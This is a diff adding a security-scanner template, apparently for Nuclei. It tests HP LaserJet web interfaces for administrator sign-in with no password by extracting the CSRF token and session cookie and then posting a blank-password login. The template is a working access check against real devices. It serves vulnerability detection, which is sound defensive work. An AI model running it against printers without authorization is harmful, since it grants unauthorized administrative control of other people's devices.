@@ -1,0 +1,70 @@
+id: hp-device-signin-csrf
+
+info:
+  name: HP LaserJet Admin/No Password Sign-In
+  author: n0ur5
+  severity: medium
+  description: |
+    This template extracts the CSRF token and sessionId from an HP device's sign-in page and attempts authentication using the extracted values, with the "Local Device Administrator" account and no password.
+  tags: csrf, auth, hp, web
+  reference:
+    - "Requires -tlsi flag to function properly."
+
+http:
+  - raw:
+      - |
+        GET /hp/device/SignIn/Index HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Referer: https://{{Hostname}}/
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-User: ?1
+        Connection: keep-alive
+
+    max-redirects: 5  # Follow up to 5 redirects
+
+    extractors:
+      - type: regex
+        name: csrf_token
+        internal: true
+        group: 1
+        regex:
+          - '<input\s+type="hidden"\s+id="CSRFToken"\s+name="CSRFToken"\s+value="([^"]+)"'
+
+      - type: regex
+        name: session_id
+        internal: true
+        group: 1
+        part: header
+        regex:
+          - "(?i)Set-Cookie:\\s*sessionId=([a-f0-9]+)"
+
+    stop-at-first-match: false  # Ensure both CSRF token and session ID are extracted
+
+  - raw:
+      - |
+        POST /hp/device/SignIn/Index HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: sessionId={{session_id}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Content-Type: application/x-www-form-urlencoded
+        Connection: keep-alive
+
+        CSRFToken={{csrf_token}}&agentIdSelect=hp_EmbeddedPin_v1&PinDropDown=AdminItem&PasswordTextBox=&signInOk=Sign+In
+
+    matchers:
+      - type: status
+        status:
+          - 302
+
+      - type: regex
+        part: header
+        regex:
+          - "Location: /hp/device/DeviceStatus/Index"
